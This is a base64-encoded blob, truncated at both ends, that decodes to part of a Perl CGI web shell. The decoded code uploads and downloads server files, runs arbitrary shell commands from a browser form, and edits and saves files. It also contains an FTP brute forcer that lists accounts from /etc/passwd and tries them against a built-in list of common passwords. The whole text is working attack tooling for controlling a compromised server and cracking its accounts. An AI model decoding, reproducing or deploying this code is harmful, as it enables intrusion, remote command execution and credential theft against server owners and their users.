JzYnIGNvbG9yPXJlZD5LaWxsZWQgaXQhPC9mb250PgpFTkQKCX0KfQoKCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXIKIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gKIyBmZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5LgojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQp7Cglsb2NhbCgkRmlsZVVybCkgPSBAXzsKCW15ICRyZXN1bHQ9IiI7CglpZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBleGlzdHMKCXsKCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyCgkJJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJCSREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsKCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOwoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCQkkcmVzdWx0IC49IDw8RU5EOwpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4KCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LAo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPgpFTkQKCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJfQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdAoJewoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkRmlsZVVybDogJCEiOwoJCSRyZXN1bHQgLj0gJlByaW50RmlsZURvd25sb2FkRm9ybTsKCX0KCXJldHVybiAkcmVzdWx0Owp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXIKewoJbXkgJHJlc3VsdCA9ICIiOwoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOwoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZwoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWJpbm1vZGUoU0VOREZJTEUpOwoJCQliaW5tb2RlKFNURE9VVCk7CgkJfQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOwoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsKCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7CgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7CgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7CgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7CgkJY2xvc2UoU0VOREZJTEUpOwoJCWV4aXQoMSk7Cgl9CgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQoJewoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhIjsKCQkkcmVzdWx0IC49JlByaW50RmlsZURvd25sb2FkRm9ybTsKCX0KCXJldHVybiAkcmVzdWx0Owp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmVnaW5Eb3dubG9hZAp7CgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgVXBsb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJcmV0dXJuICZQcmludEZpbGVVcGxvYWRGb3JtOwoKCX0KCW15ICRyZXN1bHQ9IiI7CgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2VzcwoJJHJlc3VsdCAuPSAiVXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsKCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsKCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7CgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsKCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsKCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdAoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpCgl7CgkJJHJlc3VsdCAuPSAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOwoJfQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQKCXsKCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkKCQl7CgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOwoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsKCQkJY2xvc2UoVVBMT0FERklMRSk7CgkJCSRyZXN1bHQgLj0gIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOwoJCQkkcmVzdWx0IC49ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7CgkJfQoJCWVsc2UKCQl7CgkJCSRyZXN1bHQgLj0gIkZhaWxlZDogJCE8YnI+IjsKCQl9Cgl9CgkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJcmV0dXJuICRyZXN1bHQ7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZS4gSWYgdGhlCiMgZmlsZW5hbWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluawojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBEb3dubG9hZEZpbGUKewoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIGRvd25sb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJfQoJCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwgKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlCgl7CgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOwoJfQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUKCXsKCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOwoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7Cgl9CgoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUKCXsKCQlyZXR1cm4gJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsKCX0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlCgl7CgkJcmV0dXJuICZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkKIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQojIG91dHB1dCBvZiB0aGUgY2hhbmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEV4ZWN1dGVDb21tYW5kCnsKCW15ICRyZXN1bHQ9IiI7CglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kCgl7CgkJIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLgoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsKCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7CgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZCA8L3J1bj48YnI+PHRleHRhcmVhIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7CgkJIyB4dWF0IHRob25nIHRpbiBraGkgY2h1eWVuIGRlbiAxIHRodSBtdWMgbmFvIGRvIQoJCSRSdW5Db21tYW5kPSAkV2luTlQ/ImRpciI6ImRpciAtbGlhIjsKCQkkcmVzdWx0IC49ICZSdW5DbWQ7Cgl9ZWxzaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqZWRpdFxzKyguKykvKQoJewoJCSRyZXN1bHQgLj0gICZTYXZlRmlsZUZvcm07Cgl9ZWxzZQoJewoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7CgkJJHJlc3VsdCAuPSZSdW5DbWQ7Cgl9CgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOwoJcmV0dXJuICRyZXN1bHQ7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBydW4gY29tbWFuZAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpzdWIgUnVuQ21kCnsKCW15ICRyZXN1bHQ9IiI7CgkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7CglpZighJFdpbk5UKQoJewoJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7CgkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOwoJfQoJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZAoJewoJCSR8PTE7CgkJJENvbW1hbmQgLj0gIiB8IjsKCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsKCQl3aGlsZSg8Q29tbWFuZE91dHB1dD4pCgkJewoJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsKCQkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygiJF9cbiIpOwoJCX0KCQkkfD0wOwoJfQoJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzCgl7CgkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygnJENvbW1hbmQnKTsKCX0KCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgRm9ybSBTYXZlIEZpbGUgCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0Kc3ViIFNhdmVGaWxlRm9ybQp7CglteSAkcmVzdWx0ID0iIjsKCXN1YnN0cigkUnVuQ29tbWFuZCwwLDUpPSIiOwoJbXkgJGZpbGU9JnRyaW0oJFJ1bkNvbW1hbmQpOwoJJHNhdmU9Jzxicj48aW5wdXQgbmFtZT0iYSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2F2ZSIgY2xhc3M9InN1Ym1pdCIgPic7CgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kUnVuQ29tbWFuZDsKCW15ICRkaXI9IjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiZ3VpIikuIjwvc3Bhbj4iOwoJaWYoLXcgJEZpbGUpCgl7CgkJJHJvd3M9IjIzIgoJfWVsc2UKCXsKCQkkbXNnPSI8YnI+PGZvbnQgc3R5bGU9J2ZvbnQ6IDE1cHQgVmVyZGFuYTsgY29sb3I6IHllbGxvdzsnID4gUGVybWlzc2lvbiBkZW5pZWQhPGZvbnQ+PGJyPiI7CgkJJHJvd3M9IjIwIgoJfQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nI0ZGRkZGRic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOwoJJHJlYWQ9KCRXaW5OVCk/InR5cGUiOiJsZXNzIjsKCSRSdW5Db21tYW5kID0gIiRyZWFkIFwiJFJ1bkNvbW1hbmRcIiI7CgkkcmVzdWx0IC49ICA8PEVORDsKCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgoKCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CgkkUHJvbXB0Cgk8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNDAiIG5hbWU9ImMiPgoJPGlucHV0IG5hbWU9InMiIGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KCTxicj5Db21tYW5kOiA8cnVuPiAkUnVuQ29tbWFuZCA8L3J1bj4KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUiIHZhbHVlPSIkZmlsZSIgPiAkc2F2ZSA8YnI+ICRtc2cKCTxicj48dGV4dGFyZWEgaWQ9ImRhdGEiIG5hbWU9ImRhdGEiIGNvbHM9IiRjb2xzIiByb3dzPSIkcm93cyIgc3BlbGxjaGVjaz0iZmFsc2UiPgpFTkQKCQoJJHJlc3VsdCAuPSAmUnVuQ21kOwoJJHJlc3VsdCAuPSAgIjwvdGV4dGFyZWE+IjsKCSRyZXN1bHQgLj0gICI8L2Zvcm0+IjsKCXJldHVybiAkcmVzdWx0Owp9CiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KIyBTYXZlIEZpbGUKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpzdWIgU2F2ZUZpbGUoJCkKewoJbXkgJERhdGE9IHNoaWZ0IDsKCW15ICRGaWxlPSBzaGlmdDsKCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiRGaWxlOwoJaWYob3BlbihGSUxFLCAiPiRGaWxlIikpCgl7CgkJYmlubW9kZSBGSUxFOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlyZXR1cm4gMTsKCX1lbHNlCgl7CgkJcmV0dXJuIDA7Cgl9Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEJydXRlIEZvcmNlciBGb3JtCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEJydXRlRm9yY2VyRm9ybQp7CglteSAkcmVzdWx0PSIiOwoJJHJlc3VsdCAuPSA8PEVORDsKCjx0YWJsZT4KCjx0cj4KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyM8YnI+ClNpbXBsZSBGVFAgYnJ1dGUgZm9yY2VyPGJyPgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYnJ1dGVmb3JjZXIiLz4KPC90ZD4KPC90cj4KPHRyPgo8dGQ+VXNlcjo8YnI+PHRleHRhcmVhIHJvd3M9IjE4IiBjb2xzPSIzMCIgbmFtZT0idXNlciI+CkVORApjaG9wKCRyZXN1bHQgLj0gYGxlc3MgL2V0Yy9wYXNzd2QgfCBjdXQgLWQ6IC1mMWApOwokcmVzdWx0IC49IDw8J0VORCc7CjwvdGV4dGFyZWE+PC90ZD4KPHRkPgoKUGFzczo8YnI+Cjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InBhc3MiPjEyM3Bhc3MKMTIzIUAjCjEyM2FkbWluCjEyM2FiYwoxMjM0NTZhZG1pbgoxMjM0NTU0MzIxCjEyMzQ0MzIxCnBhc3MxMjMKYWRtaW4KYWRtaW5jcAphZG1pbmlzdHJhdG9yCm1hdGtoYXUKcGFzc2FkbWluCnBAc3N3b3JkCnBAc3N3MHJkCnBhc3N3b3JkCjEyMzQ1NgoxMjM0NTY3CjEyMzQ1Njc4CjEyMzQ1Njc4OQoxMjM0NTY3ODkwCjExMTExMQowMDAwMDAKMjIyMjIyCjMzMzMzMwo0NDQ0NDQKNTU1NTU1CjY2NjY2Ngo3Nzc3NzcKODg4ODg4Cjk5OTk5OQoxMjMxMjMKMjM0MjM0CjM0NTM0NQo0NTY0NTYKNTY3NTY3CjY3ODY3OAo3ODk3ODkKMTIzMzIxCjQ1NjY1NAo2NTQzMjEKNzY1NDMyMQo4NzY1NDMyMQo5ODc2NTQzMjEKMDk4NzY1NDMyMQphZG1pbjEyMwphZG1pbjEyMzQ1NgphYmNkZWYKYWJjYWJjCiFAIyFAIwohQCMkJV4KIUAjJCVeJiooCiFAIyQkI0AhCmFiYzEyMwphbmh5ZXVlbQppbG92ZXlvdTwvdGV4dGFyZWE+CjwvdGQ+CjwvdHI+Cjx0cj4KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPgpTbGVlcDo8c2VsZWN0IG5hbWU9InNsZWVwIj4KCjxvcHRpb24+MDwvb3B0aW9uPgo8b3B0aW9uPjE8L29wdGlvbj4KPG9wdGlvbj4yPC9vcHRpb24+Cgo8b3B0aW9uPjM8L29wdGlvbj4KPC9zZWxlY3Q+IAo8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0ic3VibWl0IiB2YWx1ZT0iQnJ1dGUgRm9yY2VyIi8+PC90ZD48L3RyPgo8L2Zvcm0+CjwvdGFibGU+CkVORApyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQnJ1dGUgRm9yY2VyCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEJydXRlRm9yY2VyCnsKCW15ICRyZXN1bHQ9IiI7CgkkU2VydmVyPSRFTlZ7J1NFUlZFUl9BRERSJ307CglpZigkaW57J3VzZXInfSBlcSAiIikKCXsKCQkkcmVzdWx0IC49ICZCcnV0ZUZvcmNlckZvcm07Cgl9ZWxzZQoJewoJCXVzZSBOZXQ6OkZUUDsgCgkJQHVzZXI9IHNwbGl0KC9cbi8sICRpbnsndXNlcid9KTsKCQlAcGFzcz0gc3BsaXQoL1xuLywgJGlueydwYXNzJ30pOwoJCWNob21wKEB1c2VyKTsKCQljaG9tcChAcGFzcyk7CgkJJHJlc3VsdCAuPSAiPGJyPjxicj5bK10gVHJ5aW5nIGJydXRlICRTZXJ2ZXJOYW1lPGJyPj09PT09PT09PT09PT09PT09PT09Pj4+Pj4+Pj4+Pj4+PDw8PDw8PDw8PD09PT09PT09PT09PT09PT09PT09PGJyPjxicj5cbiI7CgkJZm9yZWFjaCAkdXNlcm5hbWUgKEB1c2VyKQoJCXsKCQkJaWYoISgkdXNlcm5hbWUgZXEgIiIpKQoJCQl7CgkJCQlmb3JlYWNoI